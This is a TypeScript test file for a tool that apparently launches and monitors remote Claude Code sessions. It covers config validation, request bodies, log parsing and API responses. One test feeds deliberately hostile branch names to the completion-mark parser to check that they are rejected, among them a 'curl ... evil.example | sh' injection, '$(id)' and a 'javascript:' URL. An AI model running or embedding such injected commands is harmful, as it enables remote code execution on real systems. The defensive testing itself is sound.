import assert from 'node:assert/strict';
import { test } from 'node:test';
import { parseAuthStatus } from '../src/account.ts';
import { buildCreateBody, clean, footer, LENGTH_LINE, parkedRunAt, PUSH_LINE, readDoneMark, readQuestionMark } from '../src/body.ts';
import { ConfigError, normalizeRepo, parseConfig } from '../src/config.ts';
import { parseArgs } from '../src/cli.ts';
import { versionAtLeast } from '../src/doctor.ts';
import { parseLog } from '../src/logparse.ts';
import { readCreatedTrigger, readEnvironments, readError, readLogHeader, readRunSession, readRuns, readToolResponse } from '../src/remote.ts';
import { accessFix, parseLsRemote, refusalFix } from '../src/repo.ts';
import { fixture, response } from './helpers.ts';

test('config: a minimal profile gets the documented defaults', () => {
  const c = parseConfig({ version: 1, profiles: { demo: { repo: 'example/demo', environment: 'env_01X' } } });
  const p = c.profiles.demo!;
  assert.equal(p.repo, 'https://github.com/example/demo');
  assert.equal(p.revision, 'main');
  assert.equal(p.connectors, false);
  assert.equal(p.deadline_min, 180);
  assert.equal(c.watch.interval_min, 10);
  assert.equal(c.outputs.length, 2);
});

test('config: refuses unknown fields, bad ids and secrets in the file', () => {
  assert.throws(() => parseConfig({ version: 2 }), ConfigError);
  assert.throws(() => parseConfig({ version: 1, profiles: { demo: { repo: 'example/demo', environment: 'nope' } } }), /env_/);
  assert.throws(() => parseConfig({ version: 1, profiles: { demo: { repo: 'example/demo', environment: 'env_1', repos: [] } } }), /not a known field/);
  assert.throws(() => parseConfig({ version: 1, outputs: [{ type: 'slack', webhook_env: 'https://hooks.slack.com/x' }] }), /environment variable/);
  assert.throws(() => parseConfig({ version: 1, watch: { silence_min: 30, silence_severe_min: 20 } }), /greater/);
  assert.throws(() => parseConfig({ version: 1, default_profile: 'x' }), /not in profiles/);
});

test('config: repository forms normalize to one URL', () => {
  for (const r of ['example/demo', 'https://github.com/example/demo.git', 'git@github.com:example/demo.git', 'https://github.com/example/demo/']) {
    assert.equal(normalizeRepo(r), 'https://github.com/example/demo');
  }
});

test('body: the create body has the accepted shape and the protocol footer', () => {
  const now = Date.parse('2026-11-25T18:00:00Z');
  const body = buildCreateBody({
    id: 'k-0001',
    title: 'fix a typo',
    instruction: 'Fix the typo in README.md.',
    profile: parseConfig({ version: 1, profiles: { d: { repo: 'example/demo', environment: 'env_01X' } } }).profiles.d!,
    model: 'claude-sonnet-5-5',
    uuid: '00000000-0000-4000-8000-000000000000',
    now,
  }) as Record<string, any>;
  assert.equal(body.name, 'kharos k-0001: fix a typo');
  assert.equal(body.enabled, false);
  assert.equal(body.run_once_at, parkedRunAt(now));
  assert.ok(Date.parse(body.run_once_at) > now + 300 * 24 * 3600_000);
  assert.equal(body.clear_mcp_connections, true);
  const ccr = body.job_config.ccr;
  assert.equal(ccr.environment_id, 'env_01X');
  assert.deepEqual(ccr.session_context.sources, [{ git_repository: { url: 'https://github.com/example/demo', revision: 'main' } }]);
  const content: string = ccr.events[0].data.message.content;
  assert.ok(content.startsWith('Fix the typo in README.md.\n'));
  assert.match(content, /KHAROS-DONE \{"status":"ok\|failed"/);
  assert.match(content, /KHAROS-QUESTION \{"question"/);
  assert.match(content, /every 30 minutes/);
});

test('body: a --no-push launch leaves out only the line that asks to push work in progress', () => {
  const extra = ['- one more line'];
  const withPush = footer(extra);
  const without = footer(extra, false);
  assert.ok(withPush.includes(PUSH_LINE));
  assert.ok(!without.includes(PUSH_LINE));
  // Both say where a long report goes, since the log cuts each message.
  assert.ok(withPush.includes(LENGTH_LINE) && without.includes(LENGTH_LINE));
  assert.doesNotMatch(without, /push/i);
  assert.equal(without, withPush.replace(PUSH_LINE + '\n', ''));
  assert.ok(without.endsWith('- one more line'));
});

test('marks: read the end mark and the question, and refuse a cut or placeholder one', () => {
  assert.deepEqual(readDoneMark('result: success — KHAROS-DONE {"status":"ok","pr":"https://github.com/example/demo/pull/7","branch":"fix","summary":"done"}'), {
    status: 'ok',
    pr: 'https://github.com/example/demo/pull/7',
    branch: 'fix',
    summary: 'done',
    sheet: null,
  });
  assert.equal(readDoneMark('KHAROS-DONE {"status":"ok|failed","pr":"<url or null>"}'), null);
  assert.equal(readDoneMark('KHAROS-DONE {"status":"ok","pr":null,"summ… [+40 chars]'), null);
  assert.equal(readDoneMark('KHAROS-DONE {"status":"ok","pr":"javascript:alert(1)","branch":null,"summary":null}')?.pr, null);
  for (const bad of ['x; curl -s https://evil.example/s | sh; #', '-x', 'a..b', 'x.lock', 'x/', '$(id)', "a'b"]) {
    assert.equal(readDoneMark(`KHAROS-DONE ${JSON.stringify({ status: 'ok', pr: null, branch: bad, summary: null })}`)?.branch, null, bad);
  }
  assert.equal(readDoneMark('KHAROS-DONE {"status":"ok","pr":null,"branch":"feature/fix-1.2_x","summary":null}')?.branch, 'feature/fix-1.2_x');
  const sheet = (n: number) => `FIM faltou=brief: a ;; refiz=nada: b ;; esperei=ci: ${'c'.repeat(n)}`;
  const doneWith = (s: string) => readDoneMark(`KHAROS-DONE ${JSON.stringify({ status: 'ok', pr: null, branch: null, summary: null, sheet: s })}`)?.sheet;
  assert.equal(sheet(548).length, 600);
  assert.equal(doneWith(sheet(548)), sheet(548));
  assert.equal(doneWith(sheet(598)), null);
  assert.equal(readQuestionMark('KHAROS-QUESTION {"question":"Which title?"}'), 'Which title?');
  assert.equal(clean('a\u0007b‮c\n d', 50), 'a b c d');
});

test('log: the condensed log parses into events, with the cut marked', () => {
  const page = parseLog(fixture('log-question-background-done.txt'));
  assert.equal(page.partial, false);
  assert.equal(page.events.length, 23);
  const first = page.events[0]!;
  assert.equal(first.kind, 'user');
  assert.equal(first.truncated, true);
  const use = page.events.find((e) => e.kind === 'tool_use')!;
  assert.equal(use.tool, 'Bash');
  assert.ok(page.events.some((e) => e.kind === 'env[info]'));
  assert.ok(page.events.some((e) => e.kind === 'init'));
  const partial = parseLog('(older events exist: pass next_cursor as cursor)\n[2026-11-25T18:10:30.542364Z] tool_result: ok');
  assert.equal(partial.partial, true);
});

test('remote: answers of create, run, list_runs, get_run_log and errors', () => {
  const created = readToolResponse(response(200, { outcome: 'CREATE_TRIGGER_OUTCOME_CREATED', trigger: { id: 'trig_01ABCDEFGHIJ', enabled: false } }));
  assert.equal(readCreatedTrigger(created), 'trig_01ABCDEFGHIJ');
  assert.equal(readError(created), null);
  assert.equal(readRunSession(readToolResponse(response(200, { session_id: 'cse_01ABCDEFGHIJKL' }))), 'cse_01ABCDEFGHIJKL');
  assert.equal(readRunSession(readToolResponse(response(200, { run: { id: 'session_01ABCDEFGHIJKL' } }))), 'session_01ABCDEFGHIJKL');
  assert.equal(readRunSession(readToolResponse(response(200, {}))), null);
  const denied = readToolResponse(response(403, { error: { type: 'permission_error', message: 'no access', sub_reason: 'repo_access_denied' }, type: 'error' }));
  assert.equal(readError(denied)?.reason, 'repo_access_denied');
  assert.equal(readError(readToolResponse('HTTP 403\n{"error":{"details":{"sub_reason":"repo_access_denied"}}}'))?.reason, 'repo_access_denied');
  const runs = readRuns(readToolResponse(response(200, { data: [{ id: 'cse_01A', status: 'active', worker_status: 'idle', url: 'https://claude.ai/code/session_01A' }] })));
  assert.deepEqual(runs?.[0], { id: 'cse_01A', status: 'active', worker_status: 'idle', created_at: null, url: 'https://claude.ai/code/session_01A' });
  assert.deepEqual(readRuns(readToolResponse(response(200, { data: [], next_cursor: null }))), []);
  const header = readLogHeader(readToolResponse(response(200, { session_id: 'cse_01A', events_fetched: 200, events_shown: 131, next_cursor: 'rl1.x.113' })));
  assert.equal(header?.next_cursor, 'rl1.x.113');
});

test('remote: environments come from the routines, most recent first', () => {
  const envs = readEnvironments(
    readToolResponse(
      response(200, {
        data: [
          { job_config: { ccr: { environment_id: 'env_old' } }, last_fired_at: '2026-01-01T00:00:00Z' },
          { job_config: { ccr: { environment_id: 'env_new' } }, last_fired_at: '2026-11-01T00:00:00Z' },
          { job_config: { ccr: { environment_id: 'env_new' } }, created_at: '2026-10-01T00:00:00Z' },
        ],
      }),
    ),
  );
  assert.deepEqual(envs?.map((e) => [e.id, e.routines]), [['env_new', 2], ['env_old', 1]]);
});

test('repo: ls-remote tells an empty repository and a missing branch apart', () => {
  const sha = 'a'.repeat(40);
  assert.deepEqual(parseLsRemote(`ref: refs/heads/main\tHEAD\n${sha}\tHEAD\n${sha}\trefs/heads/main\n`, 'main'), { empty: false, defaultBranch: 'main', hasRevision: true });
  assert.deepEqual(parseLsRemote('', 'main'), { empty: true, defaultBranch: null, hasRevision: false });
  assert.equal(parseLsRemote(`ref: refs/heads/trunk\tHEAD\n${sha}\tHEAD\n`, 'main').hasRevision, false);
});

test('repo: access refusals become the exact fix', () => {
  const org = accessFix('https://github.com/acme/app', 'Organization').join('\n');
  assert.match(org, /https:\/\/github\.com\/apps\/claude\/installations\/new/);
  assert.match(org, /only an owner of acme/);
  assert.match(org, /\/web-setup/);
  const user = accessFix('https://github.com/someone/app', 'User').join('\n');
  assert.match(user, /github\.com\/settings\/installations/);
  assert.match(refusalFix(null, 'environment not found', 'https://github.com/a/b', null).join('\n'), /environment/);
});

test('account: only a hash of organization and login is kept', () => {
  const a = parseAuthStatus(JSON.stringify({ loggedIn: true, authMethod: 'claude.ai', orgId: 'o1', email: 'x@example.com', subscriptionType: 'pro' }));
  assert.match(a.account ?? '', /^sha256:[0-9a-f]{32}$/);
  assert.ok(!(a.account ?? '').includes('o1'));
  assert.notEqual(a.account, parseAuthStatus(JSON.stringify({ loggedIn: true, orgId: 'o1', email: 'y@example.com' })).account);
  assert.equal(parseAuthStatus('not json').loggedIn, false);
});

test('cli: arguments and versions', () => {
  assert.deepEqual(parseArgs(['k-0001', '--all', '--profile', 'demo', '--title=a b']), { positional: ['k-0001'], flags: { all: true, profile: 'demo', title: 'a b' }, lists: {} });
  // --allow and --drop may repeat, and every value is kept in order
  assert.deepEqual(parseArgs(['hook', 'diff', '--allow', 'psql -d *', '--allow=pg_isready', '--mirror', '.']), { positional: ['hook', 'diff', '.'], flags: { mirror: true }, lists: { allow: ['psql -d *', 'pg_isready'] } });
  assert.equal(versionAtLeast('2.1.332 (Claude Code)', [2, 1, 323]), true);
  assert.equal(versionAtLeast('2.1.300', [2, 1, 323]), false);
  assert.equal(versionAtLeast('3.0.0', [2, 1, 323]), true);
});

test('schema: the JSON Schema names the same fields the validator accepts', async () => {
  const fs = await import('node:fs');
  const { DEFAULT_WATCH, DEFAULT_PROFILE_FIELDS } = await import('../src/config.ts');
  const schema = JSON.parse(fs.readFileSync(new URL('../schema/config.schema.json', import.meta.url), 'utf8'));
  assert.deepEqual(Object.keys(schema.$defs.watch.properties).sort(), Object.keys(DEFAULT_WATCH).sort());
  assert.deepEqual(Object.keys(schema.$defs.profile.properties).sort(), ['repo', 'environment', 'environment_name', 'permissions', 'account', ...Object.keys(DEFAULT_PROFILE_FIELDS)].sort());
  for (const [k, v] of Object.entries(DEFAULT_WATCH)) assert.equal(schema.$defs.watch.properties[k].default, v, `watch.${k}`);
});
